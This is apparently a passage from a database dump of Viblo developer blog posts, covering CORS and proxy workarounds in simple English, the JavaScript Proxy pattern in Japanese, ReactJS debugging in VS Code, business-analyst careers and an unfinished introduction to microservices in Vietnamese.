When you want to get something from a website, your browser sends a special message to the website that tells it where you''re from. It''s like when you go to a store and you have to show your ID to prove you''re old enough to buy something. For example, if you''re trying to get something from a website running on `localhost:3000`, your browser will send a special message that looks like this.

`Origin: [http://localhost:3000](http://localhost:3000)`

The server is like a bouncer at a party. It''s checking to see if it''s okay for certain people to come in. It looks at the special request and then sends back a response header. This header has a key called `Access-Control-Allow-Origin` that tells the server which people are allowed in. It can either be really strict and only let one person in, or it can be more relaxed and let lots of people in.

`Access-Control-Allow-Origin: [http://localhost:3000](http://localhost:3000)`

The server can open the gates wide and say "anyone can come in!" so all the domains can get what they need.

`Access-Control-Allow-Origin: \*`

Once the browser gets the info back, it checks to see if the website matches the one the server said it should. If it doesn''t, the browser gets mad and won''t let the request go through - like a bouncer at a club!

# Did the plugin “fix” it?

**In short, no.** The `access-control-allow-origin` plugin is like a magic trick that **_makes the browser think_** it can do something it normally can''t. It''s like a wizard waving a wand and saying "Abracadabra!" and **_poof_**, the browser can do something it couldn''t do before.

It''s okay to keep this plugin on while you''re working on your project. Basically, the server will tell the browser what website it can talk to. So if you want the browser to talk to your local project, then you should use this plugin!

If you''re using someone else''s stuff, the plugin won''t help. You don''t want your users to have to install a plugin just to use your stuff. That would be silly!

# Fix two: send your request to a proxy

You don''t try to trick your browser by installing a plugin - that''s naughty! But you can control the address that your web app''s API requests go to - that''s much more fun!

It''s like having a middleman between you and the server. The [cors-anywhere](https://github.com/Rob--W/cors-anywhere/#documentation) proxy server is like a bouncer at a club, it adds a special header to the request so the server will let you in and give you the data you want. It''s like a secret password that unlocks the door to the server''s data!

It works like this. Say your frontend is trying to make a GET request to:

`https://joke-api-strict-cors.appspot.com/jokes/random`

But this api does not have a `Access-Control-Allow-Origin` value in place that permits the web application domain to access it. So instead, send your GET request to:

`https://cors-anywhere.herokuapp.com/https://joke-api-strict-cors.appspot.com/jokes/random`

The proxy server receives the `https://joke-api-strict-cors.appspot.com/jokes/random` from the url above. Then it makes the request to get that server’s response. And finally, the proxy applies the `Access-Control-Allow-Origin: *` to that original response.

This solution is awesome! It''s like you''re using a secret loophole to get around the rules. It''s like you''re telling the browser, "Hey, I''m talking to another server, so you don''t have to worry about the same origin policy!"

The bad news is that using this proxy can make your apps feel like they''re moving in slow motion! It takes a while for the proxy to give you an answer.

This brings us to a final, even better approach.

# Fix three: build your own proxy

If you''re having trouble getting around the same origin policy, why not build your own proxy? That way, you don''t have to worry about sharing with other people and you can make sure you have enough resources to get the job done. Plus, you don''t have to worry about any delays!

Let''s make a special server that will get us a funny joke! All we need to do is write a few lines of code using something called `Node.js` and `Express`. Then, we can get a random joke from a website called `(https://joke-api-strict-cors.appspot.com/random_joke`. Let''s get coding!

```js
const express = require(''express'');
const request = require(''request'');

const app = express();

app.use((req, res, next) => {
  res.header(''Access-Control-Allow-Origin'', ''*'');
  next();
});

app.get(''/jokes/random'', (req, res) => {
  request(
    { url: ''https://joke-api-strict-cors.appspot.com/jokes/random'' },
    (error, response, body) => {
      if (error || response.statusCode !== 200) {
        return res.status(500).json({ type: ''error'', message: err.message });
      }

      res.json(JSON.parse(body));
    }
  )
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`listening on ${PORT}`));
```

This is like a game of telephone! The proxy is like the first person in the game. It talks to another server and asks for a random joke. Then, it passes the joke back to the original requester, like the last person in the game. The middleware is like a special rule that lets the proxy talk to the other server, even though they''re on different domains.

# Conclusion

The CORS error can be a real pain for frontend developers. But once you understand why it''s there - to protect us from bad guys trying to do bad things - it''s not so bad.

Finally, with these changes, you won''t have to worry about seeing that red CORS error in your browser console logs ever again. You''ll be able to take out the plugin or a proxy and shout "Yippee!"

![image.png](https://images.viblo.asia/4361e6fb-57df-461a-9c6a-312c8aa8461a.png)

# And Finally
As always, I hope you enjoyed this article and learned something new.
Thank you and see you in the next articles!

If you liked this article, please give me a like and subscribe to support me. Thank you. 😊

-----
> The main goal of this article is to help you improve your **[English](https://viblo.asia/s/master-english-with-technical-knowledge-BQyJKzg14Me)** level. I will use **[Simple English](https://viblo.asia/s/master-english-with-technical-knowledge-BQyJKzg14Me)** to introduce to you the concepts related to software development. In terms of IT knowledge, it might have been explained better and more clearly on the internet, but **remember** that the main target of this article is still to **[LEARN ENGLISH](https://viblo.asia/s/master-english-with-technical-knowledge-BQyJKzg14Me)**.

# Resource
* https://tuan200tokyo.blogspot.com/2023/02/blog134say-goodbye-to-pain-called-cors.html', '2023-02-08T15:48:01.000000Z', '2023-02-28T05:00:16.000000Z', '2023-02-09T01:05:56.000000Z'),
	('Blog#134: プロキシの設計パターンを使ったJavaScript（Proxy Pattern）', 'pgjLNda7432', '9', 'public', 'https://images.viblo.asia/543a1bcb-3906-4459-b93d-0398c0db80bb.png', '

この記事の主な目的は、日本語レベルを上げるのを手伝うことです。ソフトウェア開発に関連する概念や知識なとを紹介するために簡単な日本語を使います。ITの知識に関しては、インターネット上でもっとよく説明されているかもしれませんが、この記事の主な目標はまだ日本語を学ぶことです。

こんにちは、私はトゥアンと申します。東京からフルスタックWeb開発者です。
将来の有用で面白い記事を見逃さないように、私のブログをフォローしてください。

概要
プロキシ（Proxy）デザインパターンはJavaScriptで利用できるとても面白い機能です！
プロキシデザインパターンを使えば、関数の呼び出し前後で簡単な操作を行うことができます。
主な利用用途としては、ある関数をそのまま使用できない時に関数すべてに統一的な処理を行うことがあります。

使い方
JavaScript でプロキシデザインパターンを使うに...', '![image.png](https://images.viblo.asia/543a1bcb-3906-4459-b93d-0398c0db80bb.png)

> この記事の主な目的は、[日本語](https://viblo.asia/s/-E1XVOWqNVMz)レベルを上げるのを手伝うことです。ソフトウェア開発に関連する概念や知識なとを紹介するために[簡単な日本語](https://viblo.asia/s/-E1XVOWqNVMz)を使います。ITの知識に関しては、インターネット上でもっとよく説明されているかもしれませんが、この記事の主な目標はまだ[日本語を学ぶ](https://viblo.asia/s/-E1XVOWqNVMz)ことです。
-----
こんにちは、私は[トゥアン](https://tuan-portfolio.web.app/#/)と申します。東京からフルスタックWeb開発者です。
将来の有用で面白い記事を見逃さないように、私のブログをフォローしてください。

# 概要
プロキシ（Proxy）デザインパターンはJavaScriptで利用できるとても面白い機能です！
プロキシデザインパターンを使えば、関数の呼び出し前後で簡単な操作を行うことができます。
主な利用用途としては、ある関数をそのまま使用できない時に関数すべてに統一的な処理を行うことがあります。

# 使い方
JavaScript でプロキシデザインパターンを使うには、少し変わった書き方が必要です。
書き方を確認するために、3つの主な利用用途を例に挙げてみます。

## 簡単なロギングを行う
次のプロキシを使うと、関数を呼び出した時に簡単なロギングを行うことができます。

```js
const myLoggingProxy = {
  apply(target, thisArg, args) {
    console.log(''関数が実行されました！'', target.name, args);
    return target.apply(thisArg, args);
  }
};

function myFunction(x, y) {
  return x + y;
}

// プロキシを適用
const myProxyFunction = new Proxy(myFunction, myLoggingProxy);

// 関数を実行
console.log(myProxyFunction(3, 5));
// ログ：関数が実行されました！ myFunction [3, 5]

// 結果：8
```

## 特定の条件を満たした時に関数を実行する
次のプロキシを使うと、特定の条件を満たす時に関数の評価をスキップできます。

```js
// 条件：x ＝ 4 の時だけ関数を実行
const myConditionProxy = {
  apply(target, thisArg, args) {
    const [x, y] = args;
    if (x !== 4) {
      console.log(''関数は実行されませんでした…'');
      return;
    }
    return target.apply(thisArg, args);
  }
};

function myFunction(x, y) {
  return x + y;
}

// プロキシを適用
const myProxyFunction = new Proxy(myFunction, myConditionProxy);

// 関数を実行
myProxyFunction(3, 5);
// ログ：関数は実行されませんでした…

// 結果：undefined
```

## メモ化を使って高速化する
次のプロキシを使うと、関数が実行された時に初めて評価するのではなく、前回に評価された際の結果を参照して高速化できます。

```js
const myMemoizeProxy = {
  cache: {},

  apply(target, thisArg, args) {
    const key = JSON.stringify(args);
    if (!this.cache[key]) {
      this.cache[key] = target.apply(thisArg, args);
    }
    return this.cache[key];
  },
};

async function myFunction(x, y) {
  await new Promise((resolve) => {
    console.log("wait 1s...");
    setTimeout(() => {
      resolve();
    }, 1000);
  });
  return x + y;
}

// プロキシを適用
const myProxyFunction = new Proxy(myFunction, myMemoizeProxy);

// 関数を実行
(async () => {
  for (let i = 0; i < 5; i++) {
    console.log(await myProxyFunction(3, 5));
  }
})();
// キャッシュに保管された算出結果が使われます
```

結果：
```
wait 1s...
8
8
8
8
8
```

# まとめ
以上のようにプロキシデザインパターンはJavaScriptで利用できるとっても面白い機能です！
プロキシを使うことで、関数の呼び出し前後で簡単な処理を行うことができます。

# 最後

いつもお世話になっています。この記事を楽しんで、新しいことを学べたら嬉しいです。

今度の記事でお会いしましょう！この記事が気に入ったら、私を応援するために「LIKE」を押して登録してください。ありがとうございました。

-----
> この記事の主な目的は、[日本語](https://viblo.asia/s/-E1XVOWqNVMz)レベルを上げるのを手伝うことです。ソフトウェア開発に関連する概念や知識なとを紹介するために[簡単な日本語](https://viblo.asia/s/-E1XVOWqNVMz)を使います。ITの知識に関しては、インターネット上でもっとよく説明されているかもしれませんが、この記事の主な目標はまだ[日本語を学ぶ](https://viblo.asia/s/-E1XVOWqNVMz)ことです。

# Resource
* https://tuan200tokyo.blogspot.com/2023/02/blog134-javascriptproxy-design-pattern.html', '2023-02-08T15:46:29.000000Z', '2023-02-28T03:31:08.000000Z', '2023-02-09T01:06:29.000000Z'),
	('Hướng dẫn debug trực tiếp ứng dụng ReactJS trong VScode', 'PAoJeZGAL1j', '10', 'public', 'https://images.viblo.asia/282a4d97-078a-4569-9017-bded38aca129.jpg', 'Hướng dẫn debug trực tiếp ứng dụng ReactJS trong VScode
1.	Giới thiệu
Visual studio code là ứng dụng code phổ biến hiện nay đối với các lập trình viên được phát triển bởi Microsoft. Microsoft đã rất nổi tiếng với IDE lập trình Visual Studio. Đối với các anh em lập trình ASP.Net hay C# với ứng dụng Winform hay WPF đã quá quen với IDE này và các anh em cũng quen với sư nặng nề của ứng dụng này. Đ...', '### Hướng dẫn debug trực tiếp ứng dụng ReactJS trong VScode
## 1.	Giới thiệu
[Visual studio code](https://code.visualstudio.com/download) là ứng dụng code phổ biến hiện nay đối với các lập trình viên được phát triển bởi Microsoft. Microsoft đã rất nổi tiếng với IDE lập trình Visual Studio. Đối với các anh em lập trình ASP.Net hay C# với ứng dụng Winform hay WPF đã quá quen với IDE này và các anh em cũng quen với sư nặng nề của ứng dụng này. Đối với máy tính thời sinh viên 4GB RAM thì khó thể gánh được ứng dụng này.
-	Đối với Visual studio code thì lại là 1 câu chuyện khác. Lập trình viên có thể cài các Extention mà họ cần mà không cần thiết cài một ứng dụng quá nặng như Visual studio. Đây là ưu điểm cũng là nhược điểm của VScode.
Đối với VisualStudio tôi có thể debug một cách dễ dàng với 1 Break point màu đỏ rất đẹp ở đây nhưng khi lập trình ứng dụng ReactJS trong VScode, tôi đã không thể dễ dàng debug trực tiếp ứng dụng ReactJS của mình mà phải thông qua console.log() trên browser. Điều này thật quá khó chịu đối với các state của ReactJS thì thật khó theo dõi luồng của code đang chạy
![](https://images.viblo.asia/79363272-3261-4cc2-8682-de84430fa088.jpg)
- Sau đây tôi sẽ hướng dẫn các bạn Debug trực tiếp ứng dụng ReactJS trong VScode. Hãy quên console.log() đi nhé các bạn😊😊😊. Lét go👌👌
## 2.	Tải 1 ứng dụng ReactJS và sử dụng trình Editor là VScode
 - Bước 1. Tạo 1 ứng dụng ReactJS sử dụng câu lệnh sau trên Terminal<br>
`npx create-react-app my-app`<br>
 ![](https://images.viblo.asia/209dfe35-755c-4dca-b786-9d0f644fdde0.jpg)
- Khi download thành công ứng dụng ReactJS bạn chuyển tới thư mục my-app bằng lệnh cd my-app và chạy ứng dụng myapp bằng câu lệnh`npm start`<br>
![](https://images.viblo.asia/282a4d97-078a-4569-9017-bded38aca129.jpg)
- Bạn sẽ thấy ứng dụng ReactJS mặc định như sau
![](https://images.viblo.asia/feac9a41-8795-4bf2-a24d-b57b68a001cc.jpg)

- Mở ứng dụng ReactJS đang chạy với VScode bằng lệnh` code .`
 - Bạn sẽ thấy đoạn code trong file App.js như sau:
![](https://images.viblo.asia/fd69e88f-cd17-4de5-8341-4c997c837a9f.jpg)
Vậy là xong bước thứ nhất cài đặt 1 ứng dụng ReactJS.
## 3.	Thiết lập debug ứng dụng ReactJS trong VScode
*  Bước 1. Bạn click vào biểu tượng Debug bên trái và click nút Run and Debug
*  Bước 2. Click Web App Chrome để tạo file config ![](https://images.viblo.asia/7e9c0f6f-92a8-402c-9387-bd602d511fb8.jpg)
VScode sẽ tạo ra file launch.json trong thư mục` .vscode`
![](https://images.viblo.asia/651a7fa3-a90b-46c0-a0f6-c0a0b8d50ef4.jpg)
Bạn hãy thay đổi file config như sau:
```
{
    // Use IntelliSense to learn about possible attributes.
    // Hover to view descriptions of existing attributes.
    // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387
    "version": "0.2.0",
    "configurations": [
        {
            "type": "chrome",
            "request": "launch",
            "name": "Launch Chrome against localhost",
            "url": "http://localhost:3000",
            "webRoot": "${workspaceFolder}/src"
        }
    ]
}
```
Như vậy là đã xong phần thiết lập.
## 4.	Thực hiện việc debug ReactJS trực tiếp trên VScode
- Trong file App.js tôi viết 1 ví dụ sau để kiểm tra giá trị của biến tên debug.![](https://images.viblo.asia/c9041c80-0af6-4cf8-91fc-d20d583dc649.jpg)
- Click chuột trái vào dòng bạn muốn debug trên Vscode
 ![](https://images.viblo.asia/db4d9d4e-c476-464c-b2e4-06a62587711e.jpg)
Click và nút Run and debug hoặc nhấn phím F5
 ![](https://images.viblo.asia/cd5d240f-81a2-4f71-a6d8-cfee972d4627.jpg)
Ứng dụng ReactJS của bạn đã dừng tại nơi bạn đặt break point và bạn có thê xem giá trị của biến đó khi hover chuột. Ở ví dụ trên biến có giá trị bằng 1. Bạn nhấn F10 để chạy tiếp chương trình. Phím tắt này sẽ giống như trên Visual Studio.
![](https://images.viblo.asia/e7d0b5f8-19bd-4d70-9eae-cef74c913bf7.jpg)
## 5. Kết luận
Như vậy tôi đã hướng dẫn các bạn debug trực tiếp ứng dụng ReactJS trong VScode. Hy vọng nó sẽ giúp các bạn tìm ra các bug một cách nhanh nhất. Hẹn gặp lại các bạn trong các bài viết tiếp theo. See you!', '2023-02-08T15:28:37.000000Z', '2023-02-28T04:44:05.000000Z', '2023-02-08T15:30:26.000000Z'),
	('Không “ xuất thân” IT, làm thế nào để trở thành 1 Business Analyst "chất" ? (Phần 1)', 'zXRJ8n59VGq', '11', 'public', 'https://images.viblo.asia/91c7e28e-edb0-4cbc-92cc-7618860fd2ef.png', '🌱🌱🌱Vừa học vừa viết🌱🌱🌱

Xuất thân là 1 Non.IT chính hiệu, nên đây cũng là câu hỏi mà mình không ngừng đặt ra trong quá trình tìm hiểu và phát triển công việc yêu thích của mình là Business Analyst. Để trả lời cho câu hỏi này mình đã có 1 bài viết tổng hợp thông tin bao gồm 3 nội dung sau đây, mong rằng anh chị làm tuyển dụng và các anh chị cùng ngành có thể tham khảo và góp ý cho những gì mình ...', '🌱🌱🌱Vừa học vừa viết🌱🌱🌱

Xuất thân là 1 Non.IT chính hiệu, nên đây cũng là câu hỏi mà mình không ngừng đặt ra trong quá trình tìm hiểu và phát triển công việc yêu thích của mình là Business Analyst. Để trả lời cho câu hỏi này mình đã có 1 bài viết tổng hợp thông tin bao gồm 3 nội dung sau đây, mong rằng anh chị làm tuyển dụng và các anh chị cùng ngành có thể tham khảo và góp ý cho những gì mình còn thiếu sót:

(1)	Business Analyst được định nghĩa như thế nào? BA làm gì trong một dự án?

(2)	"Khẩu vị" tuyển dụng của các Cty và ba nhóm đối tượng có thể trở thành BA?

(3)	Cần trau dồi học hỏi những gì để trở thành BA “chất” ?

Cũng như việc chọn người để yêu, trước hết bạn cần biết người đó là ai, đặc điểm tính cách như thế nào... Khi phân tích 1 vấn đề cũng vậy, bao giờ chúng ta cũng nên xuất phát từ việc, đi tìm định nghĩa của vấn đề. Vậy Business Analyst đang được định nghĩa thế nào?
![](https://images.viblo.asia/91c7e28e-edb0-4cbc-92cc-7618860fd2ef.png)

# 1.	Business Analyst (BA) là gì?
Theo Babok Guide (Sách của tổ chức International Institute of Business Analyst (IIBA))

**Business analysis (BA)** is the practice of enabling change in an enterprise by defining needs and recommending solutions that deliver value to  stakeholders. Business analysis enables an enterprise to articulate needs and the rationale for change, and to design and describe solutions that can deliver value.

**Phân tích nghiệp vụ (BA)** là hoạt động chuyên môn cho phép tạo ra sự thay đổi cho doanh nghiệp bằng cách định nghĩa nhu cầu và đề xuất giải pháp đem lại giá trị cho các stakeholders. Việc phân tích cho phép một doanh nghiệp nói rõ nhu cầu và lý do thay đổi và để thiết kế và mô tả các giải pháp có thể mang lại giá trị.

Khái niệm trong sách đề cập là… rất rộng, đề cập đến việc phân tích và cải tiến toàn bộ các lĩnh vực hoạt động của 1 doanh nghiệp như chiến lược kinh doanh, mô hình hoạt động, hệ thống phần mềm, hệ thống dữ liệu, quy trình vận hành nghiệp vụ...

Tuy nhiên, bài viết dưới đây mình chỉ xin phép chỉ đề cập đến công việc của BA thường sẽ gắn với 1 hệ thống nghiệp vụ và phần mềm tại các công ty, tóm gọn trong phạm vi công việc thực tế mà “hầu hết’’ các bạn BA và IT.BA tại Việt Nam đang làm việc nhé.

**Cách hiểu của mình:** Ở đâu có vấn đề, có cải tiến, có cơ hội ở đó có BA. BA là cầu nối giữa các Stateholder (các bên liên quan) trong một dự án phát triển, để chuyển các yêu cầu đề bài/quy trình thực tế của KH hoặc người dùng thành các yêu cầu mà hệ thống có thể đáp ứng và xử lý được và định nghĩa các yêu cầu, mô hình hóa các vấn đề của KH/người dùng từ đó đề suất giải pháp giải (giải pháp nghiệp vụ hoặc hệ thống) để quyết vấn đề đó.

**Ví dụ về công việc của 1 BA:**

(1)	Phòng kế toán công ty bạn đang cần gửi 1 báo cáo cho cơ quan thuế, dữ liệu báo cáo lên đến hàng triệu dòng, với các công thức tính thuế khác nhau. Nếu công việc này được thực hiện thủ công tay bởi nhân viên kế toán thì sẽ mất rất nhiều nguồn lực, thời gian và rủi ro sai sót. Công việc của 1 BA là đưa ra logic xử lý giúp cho nv kế toán chỉ sau 1 cú click chuột trên hệ thống thống phần mềm của công ty, hàng triệu dòng dữ liệu đó sẽ được tính toán gọn gàng trong báo cáo với số liệu hoàn toàn chính xác, đồng thời tối ưu được nghiệp vụ hằng ngày của nhân viên kế toán đó.

(2)	Hoặc công ty bạn nhận hợp đồng xây dựng 1 phần mềm quản lý nhân sự cho công ty KH, bạn sẽ là người sứ giả vi hành sang công ty KH tìm hiểu việc  quản lý nhân sự hiện tại và đưa ra giải pháp phần mềm quản lý và cùng team IT xây dựng hệ thống được đo ni đóng giày phù hợp với các yêu cầu thực tế KH mong muốn.

# 2.	BA làm gì trong một dự án?
Dựa trên tìm hiểu và tổng hợp của mình trên 11 Job description của các công ty công nghệ và các doanh nghiệp lớn trên thị trường tuyển dụng Business Analyst như Viettel, VPS, Techcombank, VPbank, FPT, Nashtech, Onemount, BKAV, VCCOP, VNG, CMC… cũng như thực tế công việc hàng ngày mình đang được trải nghiệm, mình có những tổng hợp về các hoạt động chính của vị trí BA như sau:

*(Note: Cách mình đã tổng hợp thông tin trên như thế nào? Nhóm các đầu việc tương tự nhau trong JD về các đề mục đầu mục chung, sử dụng các từ ngữ trong JD của các công ty để viết tóm tắt lại các công việc mà 1 BA đang thực hiện)*

**1.	Thu thập thông tin, nghiên cứu và xây dựng đề bài**
-	Khảo sát, thu thập, phân tích các yêu cầu của người dùng và mô hình hóa các yêu cầu nhằm xác định các vấn đề còn tồn tại hoặc xác định các cơ hội kinh doanh mới, sản phẩm mới.
-	Người dùng ở đây có thể là người dùng nội bộ hệ thống tại công ty bạn hoặc là đối tác KH bên ngoài mua giải pháp của công ty bạn.

📌Đầu ra: Xác định được đề bài cần giải quyết.

**2.	Đề xuất giải pháp hệ thống cho đề bài trên**
-	Đề xuất giải pháp nghiệp vụ và giải pháp hệ thống: xây dựng tính năng cải tiến, tiện ích dịch vụ, quy trình nghiệp vụ hoặc sản phẩm mới giải quyết vấn đề đã làm rõ bên trên.
-	Tài liệu hóa các giải pháp nghiệp vụ và hệ thống trên: BRD, SRS, …

📌Đầu ra: Chi tiết giải pháp cho đề bài đã xác định có thể là giải pháp hệ thống hoặc giải pháp nghiệp vụ.

**3.	Phát triển giải pháp hệ thống cùng team phát triển**
-	Phát triển giải pháp nghiệp vụ cùng các bộ phận vận hành nghiệp vụ.
-	Tham gia phát triển giải pháp hệ thống cùng Team Dev, Tester, UI/UX, CX,…
-	Đầu mối đào tạo cho các thành viên dự án hiểu về vấn đề nghiệp vụ.

 📌Đầu ra: Hình thành sản phẩm giải pháp demo.

**4.	Kiểm định và đảm bảo chất lượng của giải pháp**
-	Kiểm soát việc đáp ứng yêu cầu nghiệp vụ của ứng dụng bằng việc test đánh giá và kiểm thử

📌Đầu ra: Sản phẩm được thử nghiệm và kiểm định cất lượng.

**5.	Đào tạo và chuyển giao**
-	Xây dựng tài liệu tài liệu vận hành và hướng dẫn sử dụng hệ thống.
-	Hướng dẫn đào tạo sản phẩm, giải pháp cho người dùng.
-	Hỗ trợ sau golive, thu thập thông tin phản hồi từ người dùng.

📌Đầu ra: Hoàn thiện việc đưa giải pháp của sản phẩm vào thực tế.

**6.	Các vấn đề liên quan**
-	Xây dựng hợp đồng với đối tác, kiểm soát rủi ro thông tin, luật pháp…

Vậy là có 6 nghiệp vụ xung quanh công việc của 1 BA, ở đây mình tạm thời bỏ qua các mô hình phát triển dự án như Agile-scrum, Waterfall… mình chỉ nói về “Khu vực hoạt động” của  các bạn BA trong 1 chu trình phát triển giải pháp hoặc phầm mềm hoàn chỉnh, các các đầu việc này sẽ được áp dụng linh hoạt theo từng mô hình phát triển dự án.

# 3.	“Khẩu vị” tuyển dụng của các công ty và ba nhóm đối tượng có thể trở thành BA.
Mỗi bạn sẽ có một xuất phát điểm khác nhau, trên con đường để trở thành một BA “chất”, việc bạn nắm được lợi thế, những điều cần cải thiện và “khẩu vị” tuyển dụng của các công ty sẽ giúp bạn có cái nhìn tổng quát về bức tranh chung và đưa ra “chiến lược” phát triển phù hợp nhất với mình. Có 3 nhóm xuất phát điểm để trở thành BA

(**1)	Những bạn có chuyên môn về công nghệ**
+ **Lợi thế** : có kiến thức nền tảng chuyên về CNTT, dễ dàng tiếp cận các vấn đề kỹ thuật phức tạp, dễ dàng nắm được hoạt động của hệ thống và đưa ra giải pháp hệ thống.
+ **Những điều cần bổ sung**: Kiến thức cơ bản về các nghiệp vụ phi kỹ thuật (ví dụ như kế- kiểm toán, tài chính ngân hàng…). Các bạn cũng dễ bị lạc vào các giải pháp của hệ thống có thể đáp ứng thay vì những gì KH thực sự cần. Vì xuất thân kỹ thuật hơi khô khan, nên đôi khi các bạn sẽ ít linh hoạt về kỹ tương tác và giao tiếp, nên đây cũng là một kỹ năng mà các bạn cần “luyện tập”.
+ **“Khẩu vị” tuyển dụng**: Các công ty outsource chuyên về công nghệ sẽ rất ưa thích nhóm đối tượng này, do yêu cầu cao về giải pháp công nghệ xây dựng mới các giải pháp phần mềm hoặc gia công phần mềm cho đối tác, các bạn cũng có thêm cơ hội được cọ sát trên nhiều lĩnh vực nghiệp vụ khác nhau phụ thuộc vào KH mà cty bạn phục vụ.

**(2)	Những bạn có chuyên môn kinh tế, ngôn ngữ...**
+ **Lợi thế**: các bạn có “xuất thân” kinh tế thường có kiến thức nền tảng và dễ dàng tiếp cận các vấn đề chuyên sâu về nghiệp vụ phức tạp như phân tích tài chính, kế-kiểm toán, chứng khoán, sales... Ngoài ra các bạn cũng có xu hướng linh hoạt năng độn, kỹ năng truyền đạt giao tiếp tốt
+ **Những điều cần bổ sung**: các bạn sẽ phải cố gắng rất nhiều để tiếp cận được những công cụ, kỹ thuật liên quan đến CNTT mà một BA thường sử dụng. Đồng thời, cũng cần tìm hiểu thêm kết cấu kỹ thuật của 1 hệ thống dữ liệu và phần mềm để có thể thực hiện tốt vai trò “cầu nối” của mình giữa nghiệp vụ kinh tế và team IT.
+ “**Khẩu vị” tuyển dụng**: Các doanh nghiệp có 1 lĩnh vực chuyên môn đặc thù, yêu cầu bạn hiểu và phân tích sâu về một lĩnh vực nghiệp vụ kinh tế phức tạp sẽ ưa thích nhóm đối tượng này, cụ thể như hệ thống của ngân hàng, công ty chứng khoán, công ty sản xuất, xuất nhập khẩu,…

**(3)	Những bạn nắm được chuyên môn về cả công nghệ và kinh tế**

Tuyệt vời, việc nắm được thông tin cân bằng giữa 2 mảng kiến thức trên, giúp bạn có thể dễ dàng đáp ứng được với bất kỳ yêu cầu nào đến từ các nhà tuyển dụng và việc bạn làm ở đâu là do bạn lựa chọn. Đích đến cuối cùng vẫn là cân bằng kiến thức của cả 2 mảng (nghiệp vụ kinh tế và nền tảng về công nghệ) để vận dụng đưa ra được thật nhiều giải pháp hiểu quả cho dự án.

# 4. Cần trao dồi học hỏi những gì để trở thành 1 bạn BA “chất” ? (phần 2)
Như bạn thấy đó, có rất nhiều mảnh đất màu mỡ đa dạng để 1 BA có thể phát triển. Mỗi doanh nghiệp với các đặc thù hoạt động khác nhau, đều có khẩu vị riêng và bản thân các bạn cũng cần xác định được xuất phát điểm, lợi thế cạnh tranh của mình, để lựa chọn những hạt giống quý báu cần gieo trồng chăm bón, những  điều cần trao dồi cho vị trí công việc BA.

Không phải vị trí BA nào cũng yêu cầu toàn bộ kiến thức của ngành như ở phần 2 mình sẽ liệt kê trong bài viết tiếp theo, nhiều lắm... Do đó các bạn nên chọn lọc điểm mạnh của bản thân để đào sâu và phát triển nhé.

Ở đây mình sẽ cố gắng liệt kê tất cả những thông tin mình tìm được dựa trên các yêu cầu trên JD của 11 công ty nói đã đề cập ở trên và những trải nghiệm mà mình đã và đang học hỏi được trong quá trình làm việc. Vì bài viết cũng khá dài rùi nên mình sẽ chuyển phần này sang phần 2 của bài viết nhé.

**Tạm kết**nếu coi việc học tập hoàn thiện để trở thành 1 BA “chất”  là 1 dự án cần thực thi, thì mình đang thực hiện nghiệp vụ số 1 của BA đó là “Thu thập thông tin, nghiên cứu và xây dựng đề bài”. Hi vọng kiến thức mình tìm hiểu được có thể giúp định nghĩa rõ ràng hơn về ngành nghề này và chúc dự án của các bạn đạt được thành công như mong đợi nhé.

Bài tìm hiểu chắc chắn còn nhiều thiếu sót, nhưng muốn phát triển thì không thể giấu dốt, em/mình mong nhận được nhiều góp ý, đồng thời truyền được động lực cho những bạn đang tìm hiểu về ngành như em/mình 1 năm về trước nhé.', '2023-02-08T14:48:38.000000Z', '2023-02-27T15:37:05.000000Z', '2023-02-08T15:11:06.000000Z'),
	('Giới thiệu về Microservices Architecture', 'aAY4qRyqJPw', '1', 'public', 'https://images.viblo.asia/full/7321b194-b48e-4a09-bceb-d4e9acb09d4e.png', '

Hello hello, xin chào tất cả anh em. Anh em nào đã lỡ vào đây rồi thì comment chào nhau một cái nhé cho đông vui nhé. Đầu xuân năm mới, mình xin gửi lời chúc sức khỏe tới mọi người, chúc mọi người và gia đình một năm mới an khang thịnh vượng, mọi sự hanh thông, phát tài phát lộc. 🎉🎊🏆️

Bài viết này sẽ cung cấp cái nhìn tổng quát về Microservices Architecture dành cho các bạn mới bắt đầu tìm h...', '![image.png](https://images.viblo.asia/7321b194-b48e-4a09-bceb-d4e9acb09d4e.png)

Hello hello, xin chào tất cả anh em. Anh em nào đã lỡ vào đây rồi thì comment chào nhau một cái nhé cho đông vui nhé. Đầu xuân năm mới, mình xin gửi lời chúc sức khỏe tới mọi người, chúc mọi người và gia đình một năm mới an khang thịnh vượng, mọi sự hanh thông, phát tài phát lộc. 🎉🎊🏆️

Bài viết này sẽ cung cấp cái nhìn tổng quát về Microservices Architecture dành cho các bạn mới bắt đầu tìm hiểu. Với các ae đã có nhiều kinh nghiệm, mong ae (nếu được) cũng bớt thời gian tham khảo và cùng thảo luận về chủ đề này tại phần chức năng bình luận cuối bài nhé. Mời mọi người cùng đón đọc! 🙅🙆

 **LƯU Ý:** *Nếu chưa đọc hết bài, bạn hãy dùng chức năng bookmark của Viblo để lưu lại bài viết này và đọc lại sau nha.*

## 👉️ Introduction

Vào cuối năm 2022 vừa rồi, mình cũng có thực hiện một buổi thuyết trình về chủ đề cùng tên tại bộ phận mà mình làm việc. Hôm nay, mình sẽ chia sẻ lại nó dưới dạng bài viết trên Viblo. Hãy cùng mình điểm nhanh một chút về những nội dung sẽ có trong bài viết.

1. Giới thiệu chung ***(🚩We''re here)***
2. Tìm hiểu về Monolithic Architecture
    - Monolithic Architecture là gì?
    - Những trở ngại gặp phải của Monolithic Architecture?
    - Tại sao lại chuyển sang dùng Microservices?
3.  Tìm hiểu về Microservices Architecture
    - Microservices Architecture là gì?
    - Ưu điểm của microservices
    - Nhược điểm của microservices
    - Chuyển từ Monolithic sang Microservices
    - Communication giữa các microservices
    - Quản lý source code của microservices

Bắt đầu nhé! 🥍🏌️🇻🇳

## 👉️ Tìm hiểu về Monolithic Architecture

## Monolithic Architecture là gì?

Trước khi bắt đầu với Microservices, mình sẽ đề cập tới một kiến trúc sơ khai được gọi là Monolithic Architecture. Hãy cùng xem bức ảnh dưới đây trong vài giây, để ý những đặc điểm của nó và mình sẽ giả thích về nó sau lát nữa.

![image.png](https://images.viblo.asia/625cee8d-ac88-4c09-b306-8d332f43b1ff.png)

<div align="center">

*(Ảnh 1: Monolith - trích từ [English Heritage](https://www.english-heritage.org.uk/visit/places/st-breock-downs-monolith/history/))*

</div>

🖖 Three... <br>
🤞 Two... <br>
🖕 One! <br>
👉️👉️👉️ =>>>> Tiếp nào...

